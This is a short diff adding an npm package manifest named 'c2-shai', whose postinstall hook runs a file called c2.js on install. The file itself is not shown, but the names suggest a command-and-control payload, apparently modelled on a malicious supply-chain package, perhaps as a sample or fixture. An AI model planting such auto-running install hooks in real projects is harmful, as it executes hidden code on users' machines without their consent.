@@ -1,0 +1,7 @@
+{
+  "name": "c2-shai",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node c2.js"
+  }
+}
